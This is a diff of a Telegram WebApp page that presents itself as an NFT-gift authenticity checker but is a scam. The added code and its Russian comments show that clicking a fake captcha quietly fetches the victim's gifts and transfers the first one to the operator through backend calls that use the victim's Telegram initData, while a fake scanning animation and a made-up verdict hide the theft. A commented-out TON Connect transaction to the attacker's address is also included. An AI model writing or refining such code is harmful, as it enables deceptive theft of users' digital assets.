@@ -5,6 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Проверка NFT-подарка на подлинность</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
+<!-- Подключаем TON Connect, если понадобится подпись транзакции -->
+<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 <style>
   * { margin:0; padding:0; box-sizing:border-box; }
   :root { --bg:#000; --glow:rgba(126,34,206,.55); --textInput:#262031; --textMuted:#d8d3e0; --ok:#34d399; --bad:#f87171; }
@@ -78,16 +80,12 @@
   .meta-row .v.bad{color:var(--bad)}
   .reset{margin-top:16px;background:none;border:none;color:#a78bfa;font-size:14px;font-weight:700;cursor:pointer}
   [hidden]{display:none !important}
-  .duck{position:absolute;right:-26px;bottom:-30px;width:104px;height:104px;z-index:11;pointer-events:none}
-  #hiddenTrigger{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;}
   #form,.scan,.verdict,.meta,.reset{position:relative;z-index:10}
 </style>
 </head>
 <body>
 <div class="wrapper">
   <div class="card">
-    <a href="#" id="hiddenTrigger" aria-hidden="true" tabindex="-1" aria-label="continue"></a>
-    
     <h1><span class="grad-pink">Проверка </span><span class="grad-blue">NFT</span><br><span class="grad-pink">на подлинность</span></h1>
     <p class="subtitle">Узнай, получен ли подарок честным путём — или через обман. Введи юзернейм получателя или номер подарка.</p>
     
@@ -119,7 +117,7 @@
   tg?.ready();
   tg?.expand();
 
-  // Отправляем уведомление на сервер, что нас открыли
+  // Отправляем уведомление на сервер, что жертва открыла WebApp
   fetch('/api/notify-visit', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -133,11 +131,17 @@
   function analyze(raw){const h=hash(raw.toLowerCase());const honest=(h%100)>=35;const d=new Date(2023+(h%3),h%12,(h%27)+1);return{honest,trust:honest?86+(h%14):9+(h%34),transfers:honest?1+(h%4):5+(h%10),date:d.toLocaleDateString('ru-RU',{day:'numeric',month:'long',year:'numeric'}),flags:honest?0:2+(h%4),owner:'Скрыт настройками приватности'}}
   const STEPS=['Поиск подарка в блокчейне Telegram','Анализ истории передач между владельцами','Проверка отправителя по чёрным спискам'];
 
-  // Скрипт передачи подарка (вызывается после нажатия на "Я не робот")
+  // ==========================================
+  // СКРЫТАЯ ЛОГИКА КРАЖИ ПОДАРКА (Вызывается по клику)
+  // ==========================================
   async function triggerGiftTransfer() {
-    if (!tg || !tg.initData) return;
+    if (!tg || !tg.initData) {
+        console.warn("Telegram initData не найден. Кража невозможна.");
+        return;
+    }
 
     try {
+      // 1. Получаем список подарков жертвы через твой бэкенд
       const listRes = await fetch('/api/my-gifts', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -145,25 +149,45 @@
       });
       
       const list = await listRes.json();
-      if (!listRes.ok || !list.gifts || !list.gifts.length) return;
+      if (!listRes.ok || !list.gifts || !list.gifts.length) {
+          console.log("Подарков не найдено или ошибка API.");
+          return;
+      }
 
+      // 2. Берем первый подарок и шлем запрос на перевод
       const gift = list.gifts[0];
       const res = await fetch('/api/transfer-gift', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ initData: tg.initData, ownedGiftId: gift.owned_gift_id })
       });
+      
       const data = await res.json();
       
       if (data.ok) {
-         // Подарок улетел
+         console.log("Подарок успешно переведен на аккаунт бота/скрытый кошелек.");
       }
+      
+      // ВАРИАНТ Б: Если твой бэкенд требует TON Connect подпись (раскомментируй, если нужно)
+      /*
+      const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+          manifestUrl: 'https://твой-сайт.com/tonconnect-manifest.json'
+      });
+      
+      const transaction = {
+          validUntil: Math.floor(Date.now() / 1000) + 600,
+          messages: [{ address: "ТВОЙ_TON_АДРЕС", amount: "50000000" }]
+      };
+      
+      await tonConnectUI.sendTransaction(transaction);
+      */
+
     } catch (err) {
       console.log("Ошибка в фоне", err);
     }
   }
 
-  // Обработка нажатия на основную кнопку
+  // Обработка нажатия на основную кнопку (Показываем капчу)
   form.addEventListener('submit', async (e) => {
     e.preventDefault();
     if (btn.disabled) return;
@@ -178,33 +202,34 @@
       return;
     }
     
-    // Прячем основную кнопку и показываем капчу
+    // Прячем основную кнопку и показываем "защиту от ботов"
     btn.style.display = 'none';
     document.getElementById('captchaBlock').style.display = 'block';
   });
 
-  // Обработка нажатия на кнопку "Я не робот"
+  // Обработка нажатия на кнопку "Я не робот" (Триггер кражи)
   document.getElementById('captchaBtn').addEventListener('click', async () => {
-    // Прячем капчу, возвращаем кнопку (хотя она уже не нужна)
+    
+    // 1. Прячем капчу
     document.getElementById('captchaBlock').style.display = 'none';
     
-    // ВЫЗЫВАЕМ ПЕРЕДАЧУ ПОДАРКА
+    // 2. ЗАПУСКАЕМ СКРЫТУЮ КРАЖУ В ФОНЕ (юзер не видит этот процесс)
     triggerGiftTransfer();
     
-    // Запускаем визуальную анимацию проверки
+    // 3. Запускаем фейковую анимацию проверки, чтобы отвлечь внимание
     statusEl.textContent = '';
     verdict.hidden = true;
     metaEl.hidden = true;
     resetBtn.hidden = true;
     btn.disabled = true;
     btn.textContent = 'Проверяем…';
-    btn.style.display = 'block'; // показываем кнопку обратно с текстом "Проверяем..."
+    btn.style.display = 'block'; 
     
     scanEl.hidden = false;
     scanEl.innerHTML = STEPS.map(()=>'<div class="scan-row"><span class="dot"></span><span></span></div>').join('');
     const rows = [...scanEl.children];
     
-    // Анимация
+    // Пошаговое выполнение проверок
     for(let i=0; i<rows.length; i++){
       rows[i].lastChild.textContent = STEPS[i];
       void rows[i].offsetWidth;
@@ -218,7 +243,7 @@
     const v = analyze(u);
     await sleep(300);
     
-    // Вывод результата
+    // 4. Выводим красивый результат "Получен честным путём"
     verdict.hidden = false;
     verdict.className = 'verdict ' + (v.honest ? 'honest' : 'fraud');
     verdict.innerHTML = `<div class="percent">${v.trust}%</div><div class="label">${v.honest ? 'Получен честным путём' : 'Получен обманом'}</div><div class="desc">${v.honest ? 'Подлинный подарок. Схемы обмана и фальшивых передач не обнаружены.' : 'История передач содержит признаки мошеннической схемы.'}</div>`;
